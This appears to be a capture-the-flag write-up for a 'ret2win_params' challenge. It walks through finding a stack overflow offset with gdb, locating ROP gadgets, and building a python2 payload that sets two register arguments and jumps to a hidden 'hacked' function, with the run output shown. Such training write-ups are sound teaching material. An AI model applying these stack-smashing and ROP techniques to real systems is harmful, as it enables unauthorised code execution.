### SOLVE

// Locate win-function, control EIP, find parameters, pop rdi, pop_rsi
```as
gdb -q ret2win_params
since the cmp is not on stack we need to find the values via debugging (ghidra) or source-code

0x00000000004011d7	main			#(main just calls register name)
0x0000000000401142	hacked			#(compares two values)
0x0000000000401190	register_name	#(calls hacked function)

via source-code we find compare values.
# if (first == 0xdeadbeefdeadbeef && second == 0xc0debabec0debabe)

// find pop's
[INFO] File: ret2win_params
	0x000000000040124b: pop rdi; ret; 
[INFO] File: ret2win_params
	0x0000000000401249: pop rsi; pop r15; ret;

// control the $RSP
gef➤  pattern search $rsp
[+] Searching for '6461616161616161'/'6161616161616164' with period=8
[+] Found at offset 24 (little-endian search) likely

└─$ python2 -c "print('A'*24 + 'B' * 6)"
AAAAAAAAAAAAAAAAAAAAAAAABBBBBB
$rip   : 0x424242424242
```
// Create payload
```shell
// [padding + pop_rdi + param_1 + pop_rsi+r15 + param_2 + junk + hacked]
python2 -c "print('A' * 24 + '\x4b\x12\x40\x00\x00\x00\x00\x00' +  '\xef\xbe\xad\xde\xef\xbe\xad\xde' + '\x49\x12\x40\x00\x00\x00\x00\x00' +  '\xbe\xba\xde\xc0\xbe\xba\xde\xc0' + '\x90' * 8 + '\x8f\x11\x40\x00\x00\x00\x00\x00')" > payload
``` 
// Run payload
```shell
└─$ ./ret2win_params < payload 
Name:
Hi there, AAAAAAAAAAAAAAAAAAAAAAAAK@
This function is TOP SECRET! How did you get in here?! :O
zsh: segmentation fault  ./ret2win_params < payload
```
// Other way to run payload
```shell
└─$ python2 -c "print('A' * 24 + '\x4b\x12\x40\x00\x00\x00\x00\x00' +  '\xef\xbe\xad\xde\xef\xbe\xad\xde' + '\x49\x12\x40\x00\x00\x00\x00\x00' +  '\xbe\xba\xde\xc0\xbe\xba\xde\xc0' + '\x90' * 8 + '\x42\x11\x40\x00\x00\x00\x00\x00')" | ./ret2win_params
Name:
Hi there, AAAAAAAAAAAAAAAAAAAAAAAAK@
This function is TOP SECRET! How did you get in here?! :O
zsh: done                python2 -c  | 
zsh: segmentation fault  ./ret2win_params
```